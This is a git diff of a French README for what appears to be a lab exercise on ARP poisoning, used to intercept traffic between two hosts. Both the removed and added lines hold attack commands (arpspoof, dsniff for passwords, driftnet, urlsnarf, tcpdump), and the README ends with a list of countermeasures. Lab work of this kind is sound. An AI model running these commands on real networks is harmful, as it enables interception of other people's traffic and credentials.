@@ -1,19 +1,29 @@
-# ARP Poisoning - Rapport d'attaque
+# ARP Poisoning - MITM
 
 ## Objectif
-Attaque de l'homme du milieu (MITM) pour intercepter le trafic entre PC1 et PC2.
+Se placer en homme du milieu entre PC1 et PC2 pour intercepter le trafic.
 
 ## Principe
-L'attaque ARP Spoofing consiste a envoyer de fausses reponses ARP pour associer l'adresse MAC de l'attaquant a l'adresse IP de la cible.
+Envoi de fausses reponses ARP pour associer l'adresse MAC de l'attaquant aux adresses IP des victimes.
 
-## Commandes executees
-arpspoof -i eth0 -t 10.0.0.10 10.0.0.20
-arpspoof -i eth0 -t 10.0.0.20 10.0.0.10
+## Utilisation
+```bash
+sudo python3 arp_poisoning.py
+```
 
-## Resultats attendus
-- driftnet -i eth0 (images)
-- urlsnarf -i eth0 (URLs)
-- dsniff -i eth0 (mots de passe)
+## Configuration
+- Victim PC1: 192.168.189.200
+- Target PC2: 192.168.189.201
+- Attacker: 192.168.189.128
+
+## Capture
+```bash
+tcpdump -i eth0 -w capture.pcap
+driftnet -i eth0
+urlsnarf -i eth0
+```
 
 ## Contre-mesures
-ARP statique, arpwatch, HTTPS
+- ARP statique
+- arpwatch
+- HTTPS everywhere
